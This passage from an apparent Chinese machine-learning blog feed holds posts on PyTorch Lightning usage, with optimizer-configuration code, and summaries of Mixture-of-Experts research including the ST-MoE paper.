      </tags>
  </entry>
  <entry>
    <title>PyTorch Lightning: 让 PyTorch 更为易用</title>
    <url>/blog/2022/08/11/pytorch-lightning/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>今天来介绍一个很好用的深度学习框架，PyTorch Lightning。从名字就可以看出，它是基于 PyTorch 的框架。它的核心思想是，将学术代码（模型定义、前向 / 反向、优化器、验证等）与工程代码（for-loop，保存、tensorboard 日志、训练策略等）解耦开来，使得代码更为简洁清晰。工程代码经常会出现在深度学习代码中，PyTorch Lightning 对这部分逻辑进行了封装，只需要在 Trainer 类中简单设置即可调用，无需重复造轮子。</p>
<span id="more"></span>
<h2 id="介绍">介绍</h2>
<p>近些年来，各种深度学习框架层出不穷，TensorFlow、PyTorch 已经成为深度学习研究人员使用最多的两个框架。其中，PyTorch 的热度连年飙升，大有超越 TensorFlow 之势。 基础的张量运算、计算图等功能已经被这些框架支持的很好了，后面的框架开始着力于解决其他问题，例如：</p>
<ul>
<li>transformers: 致力于简单高效地使用预训练模型，支持 PyTorch 和 TensorFlow 作为后端</li>
<li> Fairseq：提供通用建模序列任务的工具包，包含丰富高效的命令行接口，基于 PyTorch</li>
<li>Pytorch Lightning：解决深度学习代码中，学术代码、工程代码耦合性高，工程代码需要重复造轮子等问题</li>
</ul>
<p>我之前已经介绍过 transformers 了，相信做 NLP 的同学都对这个框架很熟悉了。Fairseq 我也接触过一段时间，但是由于其文档不是很详细，大部分问题都要读源码才能找到答案， 入门起来比较痛苦。Pytorch Lightning 就是本文的重点了，下面做详细介绍。</p>
<h2 id="一个例子">一个例子</h2>
<p>引用一个官网的 gif，介绍 Pytorch Lightning 的动机是什么。一段典型的、基于 PyTorch 的深度学习代码可能是下面左侧的这样的， 包含：模型、优化器、数据定义，训练、验证循环逻辑。</p>
<p><img src="pl_quick_start_full_compressed.gif"></p>
<p>可以将其转化为右侧的 Lightning Module，按照以下步骤：</p>
<ul>
<li>将模型定义代码写在<code>__init__</code>中</li>
<li>定义前向传播逻辑</li>
<li>将优化器代码写在 <code>configure_optimizers</code> 钩子中</li>
<li>训练代码写在 <code>training_step</code> 钩子中，可以使用 <code>self.log</code> 随时记录变量的值，会保存在 tensorboard 中</li>
<li>验证代码写在 <code>validation_step</code> 钩子中</li>
<li>移除硬件调用<code>.cuda()</code> 等，PyTorch Lightning 会自动将模型、张量的设备放置在合适的设备；移除<code>.train()</code> 等代码，这也会自动切换</li>
<li>根据需要，重写其他钩子函数，例如 <code>validation_epoch_end</code>，对 <code>validation_step</code> 的结果进行汇总；<code>train_dataloader</code>，定义训练数据的加载逻辑</li>
<li>实例化 Lightning Module 和 Trainer 对象，传入数据集</li>
<li>定义训练参数和回调函数，例如训练设备、数量、保存策略，Early Stop、半精度等</li>
</ul>
<p>其中，最为直接的好处是，你无需关注模型和张量的设备，可以省去不计其数的<code>.cuda()</code>，再也不需要担心 device 报错了（当然，自己新建的张量还是需要调整下设备的）。 此外就是功能强大的 Trainer 和 tensorboard 的集成，可以非常优雅地调用。</p>
<h2 id="进阶">进阶</h2>
<p>如果想要解锁 PyTorch Lightning 的更多玩法，可以参考<a href="%5BBasic%20skills%20—%20PyTorch%20Lightning%201.8.0dev%20documentation%20(pytorch-lightning.readthedocs.io)%5D(https://pytorch-lightning.readthedocs.io/en/latest/levels/core_skills.html)">官方文档</a>，详细地介绍了各种技巧，辅以代码示例，很容易理解上手。对于核心的 API，Lightning Module 的各种钩子，Trainer 的参数、用法，也做了详细的介绍。文档中还包含各种常见的工作流、上手教程，内容非常的齐全。</p>
<p>例如，<code>configure_optimizers</code> 支持配置多个优化器、搭配学习率衰减策略。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># most cases. no learning rate scheduler</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure_optimizers</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">return</span> Adam(self.parameters(), lr=<span class="number">1e-3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># multiple optimizer case (e.g.: GAN)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure_optimizers</span>(<span class="params">self</span>):</span></span><br><span class="line">    gen_opt = Adam(self.model_gen.parameters(), lr=<span class="number">0.01</span>)</span><br><span class="line">    dis_opt = Adam(self.model_dis.parameters(), lr=<span class="number">0.02</span>)</span><br><span class="line">    <span class="keyword">return</span> gen_opt, dis_opt</span><br><span class="line"></span><br><span class="line"><span class="comment"># example with learning rate schedulers</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure_optimizers</span>(<span class="params">self</span>):</span></span><br><span class="line">    gen_opt = Adam(self.model_gen.parameters(), lr=<span class="number">0.01</span>)</span><br><span class="line">    dis_opt = Adam(self.model_dis.parameters(), lr=<span class="number">0.02</span>)</span><br><span class="line">    dis_sch = CosineAnnealing(dis_opt, T_max=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">return</span> [gen_opt, dis_opt], [dis_sch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># example with step-based learning rate schedulers</span></span><br><span class="line"><span class="comment"># each optimizer has its own scheduler</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure_optimizers</span>(<span class="params">self</span>):</span></span><br><span class="line">    gen_opt = Adam(self.model_gen.parameters(), lr=<span class="number">0.01</span>)</span><br><span class="line">    dis_opt = Adam(self.model_dis.parameters(), lr=<span class="number">0.02</span>)</span><br><span class="line">    gen_sch = {</span><br><span class="line">        <span class="string">'scheduler'</span>: ExponentialLR(gen_opt, <span class="number">0.99</span>),</span><br><span class="line">        <span class="string">'interval'</span>: <span class="string">'step'</span>  <span class="comment"># called after each training step</span></span><br><span class="line">    }</span><br><span class="line">    dis_sch = CosineAnnealing(dis_opt, T_max=<span class="number">10</span>) <span class="comment"># called every epoch</span></span><br><span class="line">    <span class="keyword">return</span> [gen_opt, dis_opt], [gen_sch, dis_sch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># example with optimizer frequencies</span></span><br><span class="line"><span class="comment"># see training procedure in `Improved Training of Wasserstein GANs`, Algorithm 1</span></span><br><span class="line"><span class="comment"># https://arxiv.org/abs/1704.00028</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure_optimizers</span>(<span class="params">self</span>):</span></span><br><span class="line">    gen_opt = Adam(self.model_gen.parameters(), lr=<span class="number">0.01</span>)</span><br><span class="line">    dis_opt = Adam(self.model_dis.parameters(), lr=<span class="number">0.02</span>)</span><br><span class="line">    n_critic = <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        {<span class="string">'optimizer'</span>: dis_opt, <span class="string">'frequency'</span>: n_critic},</span><br><span class="line">        {<span class="string">'optimizer'</span>: gen_opt, <span class="string">'frequency'</span>: <span class="number">1</span>}</span><br><span class="line">    )</span><br></pre></td></tr></tbody></table></figure>
<p>可以在，<code>epoch_end</code> 系列的钩子中，完成 Epoch-level 的 metric 计算。以 <code>validation_epoch_end</code> 为例，其接收一个参数 <code>validation_step_outputs</code>，是一个 list，包含了 <code>validation_step</code> 的所有返回结果。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validation_step</span>(<span class="params">self, batch, batch_idx</span>):</span></span><br><span class="line">    x, y = batch</span><br><span class="line">    y_hat = self.model(x)</span><br><span class="line">    loss = F.cross_entropy(y_hat, y)</span><br><span class="line">    pred = ...</span><br><span class="line">    <span class="keyword">return</span> pred</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validation_epoch_end</span>(<span class="params">self, validation_step_outputs</span>):</span></span><br><span class="line">    all_preds = torch.stack(validation_step_outputs)</span><br><span class="line">    ...</span><br></pre></td></tr></tbody></table></figure>
<p>Trainer 中，常见的回调函数有 <code>ModelCheckpoint</code>，完成模型的定期保存；<code>EarlyStopping</code>，定义模型的早停策略。Trainer 定义时，只需要传入 <code>precision=16</code>，即可实现 PyTorch naive 的混合半精度，如果要制定 apex 后端，也只需要加上一行 <code>amp_backend='apex'</code> 即可。使用 <code>accelerator</code> 可以方便切换各种加速设备，CPU、GPU、TPU、IPU 等等。指定 <code>strategy="ddp"</code> 即可使用数据并行策略。</p>
<p>过多的就不再赘述了，官方文档介绍的还挺详细的，按需引入即可。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://pytorch-lightning.readthedocs.io/en/latest/starter/introduction.html">Lightning in 15 minutes — PyTorch Lightning 1.8.0dev documentation (pytorch-lightning.readthedocs.io)</a></li>
</ul>
]]></content>
      <categories>
        <category>代码</category>
      </categories>
      <tags>
        <tag>代码</tag>
        <tag>框架</tag>
        <tag>PyTorch</tag>
      </tags>
  </entry>
  <entry>
    <title>MoE 相关工作、研究进展总结</title>
    <url>/blog/2022/07/03/MoE-Summary/</url>
    <content><![CDATA[<h1 id="moe">MoE</h1>
<p>今天总结一下最近读过的 MoE 相关的论文、研究进展。</p>
<h2 id="简介">简介</h2>
<p>混合专家网络（<strong>Mixture-of-Experts，MoE</strong>），旨在通过条件计算增加模型容量。具体来说，是对不同的输入激活网络中的不同部分，在控制运算量，即 FLOPs 不变的前提，显著增加模型参数，以达到增加容量的效果。这是一种稀疏网络架构，网络中只有部分参数被激活，与之对应的是传统的密集网络，每个输入都会激活所有参数。</p>
<span id="more"></span>
<p>一个例子如下所示。存在 n 个不同的专家，每个专家都是个独立的 FFN，不共享参数。门控网络对每个 token 计算专家网络上的概率分布，取 top2 专家输出的加权和作为 MoE 层的输出。</p>
<p><img src="architecture.png"></p>
<p>实现和训练过程中需要注意以下事项：</p>
<h3 id="稀疏噪声top-k门控">稀疏噪声 Top-k 门控</h3>
<p>计算 logits 时加入随机噪声，使得每个专家都有激活的机会。</p>
<p>将 Top-k 之外的 logits 置 0，降低 softmax 开销。</p>
<h3 id="负载均衡">负载均衡</h3>
<p>门控网络倾向于为特定的少数专家提供较大的权重。事实上，刚开始受到关注的某些专家会训练地更快，从而会更容易被选择。因此，需要额外的损失项保证专家间的负载均衡。</p>
<p>原始论文中使用了专家的重要性（batch 内每个 token 在同一专家的分数之和），构造辅助损失，保证每个专家收到的 batch token 的重要性相近，又设计了额外的负载损失保证每个专家收到的 token 数量近似。仔细区分的话，重要性损失保证了每个专家都有近似的训练进度，负载损失保证了专家间的负载近似平衡。</p>
<p>下面是重要性损失的公式。负载损失类似。采用这样复杂的损失形式是因为每个专家激活次数是离散量、不可微。</p>
<p><img src="Untitled.png"></p>
<h3 id="混合并行">混合并行</h3>
<p>一般而言，大模型需要分布式数据并行训练。</p>
<p>专家、参数过多时，模型难以容纳在单张卡上。需要做模型并行，将一个或多个专家放在一张卡上，不同的卡保存不同的专家。在门控网络计算完毕，得到每个 token 对应的专家后，通过多卡通信，将每个 token 转移到专家对应的设备上进行计算。</p>
<h3 id="任务数据集">任务 &amp; 数据集</h3>
<ul>
<li>语言模型：百亿 Google News、维基百科</li>
<li> NLU 常见基准：GLUE、SuperGLUE、SQuAD</li>
<li> 摘要：XSum</li>
<li> 问答：CB Web QA、CB Natural QA、CB Trivia QA</li>
<li> 翻译：WMT'14</li>
</ul>
<h3 id="问题">问题</h3>
<ul>
<li><strong>Top-k 门控</strong>：K 过大会增加通信开销，过小又可能损失性能（缺乏了多位专家的对比）</li>
<li><strong>负载均衡</strong>：辅助损失形式复杂，且引入了额外的优化目标</li>
<li><strong>模型并行</strong>：分布式模型并行需要编程上的模型划分、通信、带来额外工程开销</li>
<li><strong>训练稳定性</strong>：稀疏模型可能存在训练不稳定，即 loss 发散的问题</li>
<li><strong>难以推理部署</strong>：稀疏大模型需要大量设备才能推理部署</li>
</ul>
<h2 id="switch-transformer">Switch Transformer</h2>
<ul>
<li>多语任务上，取得了相较于密集 T5-XXL 4x 的加速</li>
</ul>
<h3 id="门控网络">门控网络</h3>
<ul>
<li>主张：原始论文中认为至少需要激活两名专家才能学习到专家间的差异，才能使训练有效。论文主张只使用一个专家，既保证了质量又简化了路由计算，性能更好。</li>
<li>使用 Top1 门控，降低通信开销。</li>
</ul>
<h3 id="负载均衡-1">负载均衡</h3>
<ul>
<li>动机：简化负载均衡辅助损失，为 tpu 训练，固定专家的最大容量</li>
<li>使用容量因子静态设置专家容量，溢出的 token 不激活任何专家，退化为残差连接。</li>
<li>简化辅助损失：使用每个专家分到的 token 比例、重要性的点积构造简化版的辅助损失。</li>
</ul>
<p>N 为专家数，T 为 token 数，<span class="math inline">\(\mathcal B\)</span> 为 batch 内的所有 token，<span class="math inline">\(f_i\)</span> 为每个专家分到的 token 比例，<span class="math inline">\(P_i\)</span> 为归一化的专家重要性。理想情况下，二者均应该为<span class="math inline"> \(1/N\)</span>。虽然<span class="math inline"> \(f_i\)</span> 不可微，但是<span class="math inline"> \(P_i\)</span> 是可微的。论文称该损失在均匀分布下是最小的。</p>
<p><img src="Untitled%201.png"></p>
<h3 id="蒸馏">蒸馏</h3>
<ul>
<li>动机：将大型稀疏模型蒸馏为小型密集模型</li>
<li>使用密集模型初始化非专家参数</li>
<li>使用 25% 教师概率 + 75% 真实标签混合蒸馏</li>
<li> 5% 的参数保留 30% 的质量</li>
</ul>
<h3 id="稳定性">稳定性</h3>
<ul>
<li>仅将路由器内部的计算使用 float32 精度，其余使用 bfloat16 不变，兼顾稳定性和效率</li>
<li>降低参数初始化的标准差，更稳定</li>
<li>仅提高专家网络的 dropout，避免过拟合。如果增加所有参数的 dropout 会损害性能。</li>
</ul>
<h2 id="hash-layers"><strong>Hash Layers</strong></h2>
<ul>
<li>在两个数据集上困惑度优于 Switch Transformer 约 0.5。</li>
</ul>
<h3 id="负载均衡-2">负载均衡</h3>
<ul>
<li>动机：不使用辅助损失达到负载均衡</li>
<li>通过随机 Hash、聚类 Hash、分散 Hash 多种方法，将建立 token - 专家间的固定 Hash 关系</li>
<li>使用多头 Hash：将专家和 embedding 分段，做 Hash、计算后再拼接到一起</li>
</ul>
<p><img src="Untitled%202.png"></p>
<h2 id="base-layers"><strong>BASE Layers</strong></h2>
<h3 id="负载均衡-3">负载均衡</h3>
<ul>
<li>动机：不使用辅助损失达到负载均衡</li>
<li>将负载均衡问题定义为线性分配问题，每个 token 和 expert 点积计算分数，将分数认作将 token 分配个 exper 的收益，按照成熟的线性分配算法求解。为避免专家、token 过多时求解全局最优的开销过大，论文并将其 token 分成若干个组，求解组内的线性分配问题。</li>
<li>线性分配问题形如：有 n 个 token 和 m 个 expert，矩阵元素 A (n,m) 是将 token n 分配给专家 m 得到的收益。满足每个专家分配 token 个数相等时，最高收益的分配方案。</li>
<li>需要两次 all2all 操作，第一次将 token 映射到随机的 worker，worker 求解组内线性分配问题，第二次 worker 将 token 发送给对应的 expert。</li>
</ul>
<p><img src="Untitled%203.png"></p>
<h2 id="dense-to-sparse-gate"><strong>DENSE-TO-SPARSE GATE</strong></h2>
<h3 id="提高训练效率">提高训练效率</h3>
<ul>
<li>动机：认为专家和稀疏门控的联合训练对模型精度产生负面影响。通过将门控由密集逐渐转为稀疏，将专家和稀疏门的训练解耦</li>
<li>具体是通过调节门控 softmax 的温度，由大而小，将大于某个分数阈值的专家均激活</li>
<li>由于密集训练完毕后，专家间自然地就存在分布不均衡，因此没有采用负载均衡控制算法</li>
<li>结果：
<ul>
<li>同样验证集困惑度，取得比 switch transformer 2x 的训练加速和 1.25x 的 FLOPs 加速</li>
<li>有无负载均衡损失的效果类似，最终专家间负载基本均衡</li>
</ul></li>
</ul>
<p><img src="Untitled%204.png"></p>
<figure>
<img src="Untitled%205.png" alt="有无辅助损失的对比"><figcaption aria-hidden="true">有无辅助损失的对比</figcaption>
</figure>
<p>有无辅助损失的对比</p>
<h2 id="tricks-for-training-sparse-translation-models"><strong>Tricks for Training Sparse Translation Models</strong></h2>
<ul>
<li>在两个数据集上改善了低资源任务的性能</li>
</ul>
<h3 id="多任务学习">多任务学习</h3>
<ul>
<li>动机：大容量的稀疏模型可能会在少资源任务上过拟合。主张这是由于专家很早就开始专业化，很少改变专业化。</li>
</ul>
<figure>
<img src="Untitled%206.png" alt="French为高资源任务，Romanian为低资源语言"><figcaption aria-hidden="true">French 为高资源任务，Romanian 为低资源语言</figcaption>
</figure>
<p>French 为高资源任务，Romanian 为低资源语言</p>
<ul>
<li>温度采样：训练过程中，按不同温度采样不同任务样本，逐渐加热温度，增大从低资源任务采样数据的比例</li>
<li>密集预训练：刚开始时固定步数内，专家参数共享进行密集预训练，提高了收敛性</li>
</ul>
<figure>
<img src="Untitled%207.png" alt="专家的过早专业化现象得到了遏制"><figcaption aria-hidden="true">专家的过早专业化现象得到了遏制</figcaption>
</figure>
<p>专家的过早专业化现象得到了遏制</p>
<h2 id="efficient-large-scale-language-modeling-with-mixtures-of-experts"><strong>Efficient Large Scale Language Modeling with Mixtures of Experts</strong></h2>
<p>关于自回归 MoE 语言模型各种设置的实证研究。</p>
<p>一些结论：</p>
<ul>
<li>相同验证集性能下，MoE 比相同 FLOPs 的密集模型训练速度更快，对域内验证数据快 8-16 倍，域外数据快 2-4 倍。</li>
<li>MoE 的零样本学习能力优于密集模型，但差距随着训练推进减小</li>
<li> MoE 从零样本到少样本间取得的性能提升差于密集模型</li>
<li> MoE 的微调性能差于密集模型，且在部分数据集上存在微调后性能变差的情况</li>
</ul>
<h3 id="稳定性-1">稳定性</h3>
<p>没有像 Switch Transformer 一样调整初始化的权重，而是增大了每个 expert 的学习率。因为与密集的数据并行相比，每个专家接收到的 token batch 减少了 E 倍，进而将梯度减小了<span class="math inline"> \(\sqrt E\)</span> 倍。E 为专家数量。因此论文主张将学习率增大<span class="math inline"> \(\sqrt E\)</span> 倍。</p>
<h2 id="gshard">GShard</h2>
<ul>
<li>一个模块，用户使用 api 为关键张量添加注释，模块会自动实现切分和并行，避免人工编程实现的工程开销。将模型设计和实现分离。</li>
<li>使用 SPMD 而非 MPMD，降低设备增多时的编译开销</li>
</ul>
<h2 id="deepspeed-moe">DeepSpeed-MoE</h2>
<p>提供了端到端的 MoE 训练和推理的解决方案，作为 DeepSpeed 库的一部分，支持最高 3.7 倍的 MoE 压缩，7.3 倍的推理优化。</p>
<p>提出了金字塔残差 MoE（PR-MoE），以更少的参数取得了比传统 MoE 更优的性能。</p>
<h3 id="压缩参数">压缩参数</h3>
<p>实验证明，网络深层使用专家效果优于浅层，因此，论文提出由浅至深逐渐增加专家的数量。也就是金字塔型。</p>
<h3 id="近似top2">近似 Top2</h3>
<p>Top2 门控虽然能带来收益，但是引入了很多训练、通信开销。论文认为，top2 门控优于 top1 门控的原因是，分数第二大的专家<strong>有时</strong>可以纠正第一个专家的错误。因此，论文提出了可以固定一个专家，从剩下的专家里选择最优的。换而言之，在专家之外添加了一个所有 token 都需要经过的 MLP，近似得到 top2 门控的性能。</p>
<p><img src="Untitled%208.png"></p>
<h3 id="蒸馏稀疏模型">蒸馏稀疏模型</h3>
<ul>
<li>将知识蒸馏到专家更少的稀疏模型里，而非传统的密集模型，保留稀疏模型训练和推理的优势</li>
<li>蒸馏过程中逐渐减小蒸馏的影响，避免损害性能</li>
</ul>
<figure>
<img src="Untitled%209.png" alt="完全使用KD损失会在训练近结束时损失性能"><figcaption aria-hidden="true">完全使用 KD 损失会在训练近结束时损失性能</figcaption>
</figure>
<p>完全使用 KD 损失会在训练近结束时损失性能</p>
<h2 id="st-moe">ST-MoE</h2>
<p>旨在解决 MoE 训练过程中的不稳定性以及微调过程中的质量不确定性。</p>
<p>论文提出了一个 269B 的稀疏模型，实现了 SOTA</p>
<h3 id="稳定性-2">稳定性</h3>
<p>论文尝试了三种常见的提高训练稳定性的方法：</p>
<ul>
<li>移除乘法交互：去除均方根尺度参数、GEGLU 激活</li>
<li>添加噪声</li>
<li>梯度裁剪</li>
</ul>
<p>虽然能够提升稳定性， 但均会损害模型质量</p>
<p>论文提出了一种路由 z-loss，约束梯度，其中，B 是 batch 中 token 数量，N 是专家的数量，</p>
<p>x 是路由器接收的 logits。该 loss 惩罚了门控网络中的大的 logits，类似 l2 正则项。</p>
<p><img src="Untitled%2010.png"></p>
<p>路由 z-loss 能提升稳定性，还能稍微改善模型质量。</p>
<h3 id="微调">微调</h3>
<ul>
<li>论文认为，稀疏模型微调效果差的原因是其倾向于过拟合。实验也证明，稀疏模型更快微调收敛，证实稀疏模型在数据分布变化时可以高效地适应优化。大任务上微调可以取得比密集模型更性能，但是在较小的任务上差于密集模型</li>
</ul>
<p><img src="overfit.png"></p>
<ul>
<li>调节 expert 的 dropout 可提升泛化性能</li>
<li> MoE 只微调非专家参数和微调所有参数性能类似。只微调非专家参数可以加速训练、减小显存。</li>
<li>密集模型和 MoE 的最优微调超参有较大差别，直接影响最后性能，不能直接照搬。</li>
</ul>
<h3 id="丢弃token健壮性">丢弃 token 健壮性</h3>
<p>微调质量不会因为 10% 的 token 丢弃率受到显著性能影响。负载不平衡可能不会显着影响模型质量。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>条件计算</category>
      </categories>
      <tags>
        <tag>条件计算</tag>
        <tag>门控</tag>
        <tag>MoE</tag>
      </tags>
  </entry>
  <entry>
    <title>ST-MoE: 高效稀疏专家网络</title>
    <url>/blog/2022/06/12/ST-MoE/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>上篇回顾了经典论文专家混合网络 MoE，今天读一篇 Google 团队在 22 年 2 月出炉的大作《ST-MoE: Designing Stable and Transferable Sparse Expert Models》，旨在解决训练过程中的不稳定性以及微调过程中的质量不确定性。论文提出的 269B 的稀疏模型，计算成本与 32B 的密集模型相当。稀疏模型第一次在迁移学习中实现了 SOTA。</p>
<span id="more"></span>
<p>值得一提的是，谷歌的大牛 Jeff Dean 也是该论文的作者之一。</p>
<h2 id="简介">简介</h2>
<p>稀疏专家网络，根据输入激活网络的不同子部分，可以更高效地增加模型容量，可参考 <a href="https://tqnwhz.github.io/blog/2022/06/05/MoE/#more">MoE：通过条件计算增加模型容量 | 一隅 (tqnwhz.github.io)</a>。简单来说，稀疏专家网络为每个 token 动态地选择模型参数，同时保证其 FLOPs 基本恒定（例如选择固定的专家数目），这允许网络极大地扩展参数数量。相较于同规模的静态网络，稀疏专家网络可有 4-7 倍的预训练加速，训练成本减少了一个数量级。性能上，该方法产生了 SOTA 的翻译模型，使用 GPT-3 1/3 的训练成本达到了同等级的单样本学习性能。</p>
<p>然而，问题依然存在。研究人员发现使用预训练的专家网络在常见基准上微调时，其性能逊于较小的模型，例如 SuperGLUE。也就是说，其迁移学习能力较差。Switch-XXL，一个参数更少但计算量大 8 倍（FLOPs 大约等于最大的 T5 模型）的模型，提高了自然语言理解任务的质量。然而，有研究指出，预训练中的不稳定性可能妨碍了必要的预训练，例如参数和计算的必要平衡。如何可靠地训练专家网络还是个悬而未决的问题。</p>
<p>本文的贡献总结如下：</p>
<ul>
<li>对稳定性 - 质量权衡进行了大规模研究</li>
<li>引入路由 z-loss，解决了不稳定问题，并略微提升了质量</li>
<li>稀疏和密集模型的微调分析，分析其对批量大小和学习率等超参数的敏感性。糟糕的超参数实际上不会导致密集模型的微调增益，尽管有很大的预训练速度提升。</li>
<li>在分布式设置中设计帕累托高效稀疏模型的架构、路由和模型设计原则。</li>
<li>跨专家层跟踪 token 路由决策的定性分析。</li>
<li>一个 269B 稀疏模型（<strong>S</strong>table <strong>T</strong>ransferable <strong>M</strong>ixture-<strong>o</strong>f-<strong>E</strong>xperts 或 ST-MoE-32B），它在各种自然语言基准测试中实现了最先进的性能。</li>
</ul>
<h2 id="训练稳定性研究">训练稳定性研究</h2>
<p>训练的稳定性，定义为训练 loss 的发散程度。下图为两个同规模 FLOPs 的稀疏模型的 loss 变化。左侧为不稳定训练，右侧为稳定训练的例子。</p>
<p><img src="stability-example.png"></p>
<p>虽然可以使用一些简单的方法提升稳定性，例如更严格的梯度裁剪、任意小的学习率，但是这往往会损害模型质量。论文将提高稳定性的方法分为以下几类进行研究：</p>
<ul>
<li>消除乘法交互</li>
<li>引入模型噪声</li>
<li>限制激活和梯度</li>
</ul>
<p>构建这项研究的主要问题是小型模型很少不稳定，但大型不稳定模型成本太高而无法运行足够的步骤和种子。与 T5-XL 匹配的稀疏模型 FLOP 是很好的研究对象，因为它在大约 1/3 的运行中不稳定，但训练成本相对低廉。论文使用 6 个随机种子，每个模型都使用掩码语言建模目标在 mC4 上进行了 20k 步的预训练。</p>
<h3 id="移除乘法交互">移除乘法交互</h3>
<p>论文展示并分析 Transformers 中两个乘法交互实例的影响。</p>
<p>GELU 门控线性单元 (GEGLU)：一种激活函数，公式如下： <span class="math display">\[
FFN_{GEGLU}(x,W,V,b,c)=GELU(xW+b)\odot(xV+c)
\]</span> 均方根尺度（Root Mean Square Scale）参数。RMS 归一化中的均方根尺度参数。RMS 归一化公式如下： <span class="math display">\[
y_i=\frac{x_i}{\sqrt{\frac1d \sum_{i=1}^d x_i^2}}\cdot g_i
\]</span> 结果如下所示。移除 GEGLU 层或 RMS 尺度参数都提高了稳定性，但对模型质量造成了重大损失。这些尺度参数 (g) 对模型质量与其他地方的参数（例如 FFN）相比具有不成比例的增益。 Shleifer 等人 (2021) 发现在 Transformers 的残差连接中添加一个学习的乘法标量会使它们更加不稳定。</p>
<p><img src="remove-multiplication.png"></p>
<h3 id="添加噪声">添加噪声</h3>
<p>一般认为，在模型中添加噪声可以提高训练稳定性（Neelakantan et al., 2015）。而且通过 dropout 注入噪声的微调很少出现不稳定的情况，论文研究了噪声是否可以提高稀疏模型的稳定性。</p>
<p>结果如下表所示，可以看到，稳定性的提升依然是以质量为代价的。</p>
<p><img src="noise.png"></p>
<h3 id="约束激活和梯度">约束激活和梯度</h3>
<p>稳定神经网络最成功的方法之一是对激活和梯度的约束。一种流行的方法是通过反向传播时裁剪梯度以避免梯度爆炸。接着是激活的约束，论文认为，路由器（也就是 MoE 里的门控网络），以 float32 精度计算专家的概率分布。这在更大的模型规模上不足以产生可靠的训练。为了解决这个问题， 论文引入了路由 z-loss，公式如下： <span class="math display">\[
L_z(x)=\frac 1 B \sum_{i=1}^B(log \sum_{j=1}^N e^{x_j^{(i)}})^2
\]</span> 其中，<span class="math inline">\(B\)</span> 是 batch 中 token 数量，<span class="math inline">\(N\)</span> 是专家的数量，<span class="math inline">\(x\in\mathcal R^{ B\times N}\)</span> 是路由器接收的 logits。该 loss 惩罚了门控网络中的大的 logits，类似 l2 正则项。</p>
<p>结果如下表所示，严格的梯度裁剪会损害性能，而路由 z-loss 则不会。论文中使用的 z-loss 的权重为 0.001。</p>
<p><img src="clip-z-loss.png"></p>
<h2 id="微调">微调</h2>
<h3 id="过拟合假设">过拟合假设</h3>
<p>论文认为，稀疏模型微调效果差的原因是其倾向于过拟合。论文在 SuperGLUE 中的两个任务进行了实验。下图为 Dense L 和 ST-MoE-L 模型的微调结果。每个模型都在来自 C4 语料库的 500B 个 token 上进行了预训练。可以看出，稀疏模型更快地收敛到 100% 的训练集精度，证实稀疏模型在数据分布变化时可以高效地适应优化。在更大的任务 ReCORD 上，稀疏模型的验证质量随着训练的提升而显着超过密集模型。然而，在较小的任务 CB 上，稀疏模型在保留数据上落后于密集模型。</p>
<p><img src="overfit.png"></p>
<p>基于此，适度的 dropout 可以提升稀疏模型的泛化性能，实验结果如下图所示。</p>
<p><img src="dropout.png"></p>
<h3 id="微调参数子集">微调参数子集</h3>
<p>为了防止过拟合，论文在微调期间尝试仅更新模型参数的子集：</p>
<ul>
<li>所有参数 (All)</li>
<li> 仅非 MoE 参数 (Non MoE)</li>
<li> 仅 MoE 参数 (MoE)</li>
<li> 仅 self-attention 和 enc-dec attention 参数 (Attention)</li>
<li> 仅非 MoE FFN 参数 (FFN)</li>
</ul>
<p>结果如下图所示，其中 3 个结果大致相同，而仅微调 MoE 参数会导致质量急剧下降。更新非 MoE 参数的效果、更新所有参数、仅更新 FFN 参数的效果差不多。只有更新非 MoE 参数才能成为加速和减少微调内存的有效方法。</p>
<p><img src="subset-fintuning.png"></p>
<h3 id="超参数">超参数</h3>
<p>论文研究两个超参数：批大小 和学习率对稀疏模型和密集模型微调的影响。在 C4 的 500B 个 token 上预训练 Dense-L 和 ST-MoE-L，然后在 SuperGLUE 上进行微调。结果如下图所示。</p>
<p><img src="batch-size-lr.png"></p>
<p>在所有超参数设置中，稀疏模型（橙色）的性能优于密集模型（蓝色）—— 然而，每个模型的最佳设置都可以显着改变结果。稀疏模型和密集模型在不同的批量大小和学习率下具有截然不同的性能。稀疏模型受益于更小的批量大小和更高的学习率。论文指出了在微调过程中正确调整批量大小和学习率的重要性。<strong>简单地使用适用于密集模型的相同微调超参数可以掩盖稀疏模型获得的任何预训练改进</strong>。换而言之，不能直接将密集模型的超参数照搬到稀疏模型微调上。</p>
<h3 id="丢弃token的健壮性">丢弃 token 的健壮性</h3>
<p>稀疏模型将 token 路由给每一层的一个或多个专家。为了使这些模型在现代硬件的 SPMD 范式中高效，专家容量（每个专家处理的 token 数量）需要提前固定。当专家收到的 token 超过其容量时，多余的 token 将被丢弃。论文使用辅助损失进行预训练，尽量向每个专家发送等量的 token 和容量因子（Capacity Factor）。专家的容量为<span class="math inline"> \(CF\cdot tokens/experts\)</span>，其中 CF 是容量因子，tokens 为一个 batch 是 token 总数。显然，理想的负载均衡情况下，CF 为 1 即可，不会有丢弃 token 现象。然而，由于很难做到如此理想的负载均衡，CF 为 1 时不可避免的会有丢失 token 现象出现，增大 CF 可缓解该现象。</p>
<p>下表展示了辅助 loss、token 丢弃率对性能的影响。出人意料的是，微调质量不会因为 10% 的 token 丢弃率受到实质性能影响。这与 Yang et al. (2021) 的结论一致，即负载不平衡可能不会显着影响模型质量。</p>
<p><img src="drop-token.png"></p>
